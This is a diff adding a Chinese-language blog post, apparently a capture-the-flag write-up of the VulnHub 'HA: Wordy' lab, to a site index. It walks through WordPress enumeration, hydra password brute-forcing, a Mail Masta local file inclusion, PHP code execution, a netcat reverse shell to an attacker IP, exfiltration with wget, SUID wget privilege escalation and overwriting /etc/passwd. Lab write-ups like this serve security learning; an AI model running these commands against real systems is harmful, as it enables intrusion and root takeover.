@@ -199,6 +199,125 @@
 ]]></content>
   </entry>
   <entry>
+    <title>Wordy Walkthrough</title>
+    <url>/2025/03/24/HAWordy/</url>
+    <content><![CDATA[<h1 id="HA-Wordy-Walkthrough"><a href="#HA-Wordy-Walkthrough" class="headerlink" title="HA: Wordy Walkthrough"></a>HA: Wordy Walkthrough</h1><h2 id="Box-Info"><a href="#Box-Info" class="headerlink" title="Box Info"></a>Box Info</h2><p>官网在这里：<a href="https://www.vulnhub.com/entry/ha-wordy,363/">HA: Wordy</a> </p>
+<p><img src="/picture/image-20250322192153885.png" alt="image-20250322192153885"></p>
+<h2 id="The-Hack"><a href="#The-Hack" class="headerlink" title="The Hack"></a>The Hack</h2><p>先进行端口扫描</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ sudo nmap -p- 172.16.33.108             </span><br><span class="line">[sudo] password <span class="keyword">for</span> kali: </span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-21 21:21 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 172.16.33.108 (172.16.33.108)</span><br><span class="line">Host is up (0.033s latency).</span><br><span class="line">Not shown: 65534 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">80/tcp open  http</span><br></pre></td></tr></table></figure>
+
+<p>看来目标主机只开放了 80 端口，进一步做应用版本发现</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ sudo nmap -p 80 -A -T4 172.16.33.108 </span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-21 21:22 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 172.16.33.108 (172.16.33.108)</span><br><span class="line">Host is up (0.033s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br></pre></td></tr></table></figure>
+
+<p>80 开放的是 Apache httpd 服务，版本为 2.4.29 ，过高，漏洞较难利用，接下来尝试进行 WEB 目录扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://172.16.33.108/</span><br></pre></td></tr></table></figure>
+
+<p>发现 wp 目录和登陆界面，猜测是 wp 构建的网站，同时发现 info.php ，但内容仅为目标主机 IP</p>
+<p><img src="/picture/image-20250322114239464.png" alt="image-20250322114239464"></p>
+<p>访问 &#x2F;wordpress&#x2F;wp-login.php ，尝试输入账户名和密码，发现存在用户名枚举漏洞，存在 admin 账户</p>
+<p><img src="/picture/image-20250322114635271.png" alt="image-20250322114635271"></p>
+<p><img src="/picture/image-20250322114713974.png" alt="image-20250322114713974"></p>
+<p>用户名确定，可以试试密码爆破</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -l admin -P /usr/share/wordlists/rockyou.txt -f -t 4 172.16.33.108 http-post-form &#x27;/wordpress/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2F172.16.33.108%2Fwordpress%2Fwp-admin%2F&amp;testcookie=1:F=is incorrect&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>发送的参数可以在开发者工具中的 NetWork 中找到</p>
+<p><img src="/picture/image-20250322114916400.png" alt="image-20250322114916400"></p>
+<p>可惜，rockyou 没跑出来，说明密码十分复杂</p>
+<p><img src="/picture/image-20250322115026326.png" alt="image-20250322115026326"></p>
+<p>既然是 wp 构建的，使用 wpscan 扫扫看</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wpscan --url http://172.16.33.108/wordpress --enumerate u,ap,at --disable-tls-checks</span><br></pre></td></tr></table></figure>
+
+<p>发现了一些目录：</p>
+<p><img src="/picture/image-20250322132718031.png" alt="image-20250322132718031"></p>
+<p>访问 readme ，只是一个下载引导页面</p>
+<p><img src="/picture/image-20250322132911433.png" alt="image-20250322132911433"></p>
+<p>再来看主题，为 twentysixteen Version: 2.0，提示似乎有点过时了</p>
+<p><img src="/picture/image-20250322133149081.png" alt="image-20250322133149081"></p>
+<p>去网上搜搜看对应版本是否有漏洞，可惜没有搜索到</p>
+<p>再来看插件，分别是</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mail-masta version 1.0</span><br><span class="line">reflex-gallery Version: 3.1.3</span><br><span class="line">site-editor Version: 1.1.1</span><br><span class="line">slideshow-gallery Version: 1.4.6</span><br><span class="line">wp-easycart-data (?)</span><br><span class="line">wp-support-plus-responsive-ticket-system Version: 7.1.3</span><br><span class="line">wp-symposium Version: 15.1</span><br></pre></td></tr></table></figure>
+
+<p>我们一个一个来，先是 mail-masta ，幸运的是，在 <a href="https://www.exploit-db.com/exploits/40290">WordPress Plugin Mail Masta 1.0 - Local File Inclusion</a> 页面能找到对应版本漏洞利用代码，而且通过 wpscan 的扫描我们得知，该 wp 服务的文件上传路径是默认的 &#x2F;wp-content 目录，那么就可以直接利用代码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://172.16.33.108/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p>成功</p>
+<p><img src="/picture/image-20250322140134547.png" alt="image-20250322140134547"></p>
+<p>看看能不能包含 apache 服务日志：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://172.16.33.108/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/apache2/sites-enabled/000-default.conf</span><br></pre></td></tr></table></figure>
+
+<p>可以包含，那么就尝试 apache 日志包含，可惜失败了，尝试通过伪协议执行命令</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -X POST -d &quot;&lt;?php system(&#x27;id&#x27;); ?&gt;&quot; &quot;http://172.16.33.108/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://input&quot;</span><br></pre></td></tr></table></figure>
+
+<p>成功执行</p>
+<p><img src="/picture/image-20250322143747568.png" alt="image-20250322143747568"></p>
+<p>尝试反弹 shell </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -X POST -d &quot;&lt;?php system(&#x27;busybox nc 10.8.0.90 1234 -e /bin/bash&#x27;); ?&gt;&quot; &quot;http://172.16.33.108/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://input&quot;</span><br></pre></td></tr></table></figure>
+
+<p>同时开启 nc 监听：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -nvlp 1234</span><br></pre></td></tr></table></figure>
+
+<p>反弹成功</p>
+<p><img src="/picture/image-20250322144039742.png" alt="image-20250322144039742"></p>
+<p>在 &#x2F;home&#x2F;raj 目录下找到第一个 flag</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">aHR0cHM6Ly93d3cuaGFja2luZ2FydGljbGVzLmlu</span><br></pre></td></tr></table></figure>
+
+<p><img src="/picture/image-20250322172934353.png" alt="image-20250322172934353"></p>
+<p>接下来就是提权，在工作目录下的 &#x2F;html 目录中，发现可疑文件，意思是需要 ZIP 来解决</p>
+<p><img src="/picture/image-20250322145304048.png" alt="image-20250322145304048"></p>
+<p>本机编写接收程序，将 zip 文件上传到宿主机上</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> http.server <span class="keyword">import</span> SimpleHTTPRequestHandler, HTTPServer</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">UploadHandler</span>(<span class="title class_ inherited__">SimpleHTTPRequestHandler</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">do_POST</span>(<span class="params">self</span>):</span><br><span class="line">        content_length = <span class="built_in">int</span>(self.headers[<span class="string">&#x27;Content-Length&#x27;</span>])</span><br><span class="line">        post_data = self.rfile.read(content_length)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;secret.zip&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(post_data)</span><br><span class="line">        self.send_response(<span class="number">200</span>)</span><br><span class="line">        self.end_headers()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    server = HTTPServer((<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">8000</span>), UploadHandler)</span><br><span class="line">    server.serve_forever()</span><br></pre></td></tr></table></figure>
+
+<p>启动接受服务</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 upload_server.py</span><br></pre></td></tr></table></figure>
+
+<p>在目标主机上执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget --post-file=secret.zip --header=&quot;Content-Type: application/octet-stream&quot; http://172.16.33.108:8000/</span><br></pre></td></tr></table></figure>
+
+<p>接收成功，解压时发现需要密码</p>
+<p><img src="/picture/image-20250322153224623.png" alt="image-20250322153224623"></p>
+<p>将密码哈希保存为字典，使用 john 破译</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">zip2john secret.zip &gt; secret.txt  </span><br><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt secret.txt</span><br></pre></td></tr></table></figure>
+
+<p>又没跑出密码，看来得在目标主机里找了（</p>
+<p><img src="/picture/image-20250322153600657.png" alt="image-20250322153600657"></p>
+<p>再来枚举其他信息，看看有什么文件具有 SUID 权限：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p>看到了一个有趣的东西：</p>
+<p><img src="/picture/image-20250322181011381.png" alt="image-20250322181011381"></p>
+<p>尝试使用 wget 的 SUID 提权，由于需要写入文件，所以进入 tmp 目录</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@ubuntu:/var/www/html/wordpress$ <span class="built_in">cd</span> /tmp</span><br><span class="line">www-data@ubuntu:/tmp$ TF=$(<span class="built_in">mktemp</span>)</span><br><span class="line">www-data@ubuntu:/tmp$ <span class="built_in">chmod</span> +x <span class="variable">$TF</span></span><br><span class="line">www-data@ubuntu:/tmp$ <span class="built_in">echo</span> -e <span class="string">&#x27;#!/bin/sh -p\n/bin/sh -p 1&gt;&amp;0&#x27;</span> &gt;<span class="variable">$TF</span></span><br><span class="line">www-data@ubuntu:/tmp$ wget --use-askpass=<span class="variable">$TF</span> 0</span><br></pre></td></tr></table></figure>
+
+<p>利用成功</p>
+<p><img src="/picture/image-20250322181324853.png" alt="image-20250322181324853"></p>
+<p>接下来就是进入 root 目录获得最终 flag</p>
+ <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># cd /root</span></span><br><span class="line"><span class="comment"># ls -la</span></span><br><span class="line"><span class="comment"># cat proof.txt</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/picture/image-20250322181504137.png" alt="image-20250322181504137"></p>
+<p>或者可以使用 cp 命令</p>
+<p>将目标主机上的 &#x2F;etc&#x2F;passwd 文件内容拷贝至主机，生成已知的密码哈希（123）</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ openssl passwd -1 123</span><br><span class="line">$1$/l/LdaOy<span class="variable">$E0kBkOBauSctDWdECVk9r</span>.</span><br></pre></td></tr></table></figure>
+
+<p>在本地生成 passwd 文件，通过 goshs 上传至目标主机 tmp 目录，将上传的 passwd 拷贝覆盖原 &#x2F;etc&#x2F;passwd ，最后经过 su 提权</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">wget http://10.8.0.90/passwd</span><br><span class="line">cp passwd /etc/passwd</span><br><span class="line">su # 输入密码 123</span><br></pre></td></tr></table></figure>
+
+<p><img src="/picture/image-20250322202054503.png" alt="image-20250322202054503"></p>
+<p>当然，直接 wget 覆盖 &#x2F;etc&#x2F;passwd 也可以</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://10.8.0.90/passwd -O /etc/passwd</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p> 看来 secret.zip 是兔子洞，误导你的</p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>Penetration Testing</category>
+      </categories>
+      <tags>
+        <tag>Penetration Testing</tag>
+        <tag>vulnhub</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>XXE 学习记录</title>
     <url>/2024/03/11/XXE%20exploit/</url>
     <content><![CDATA[<p>前言：</p>
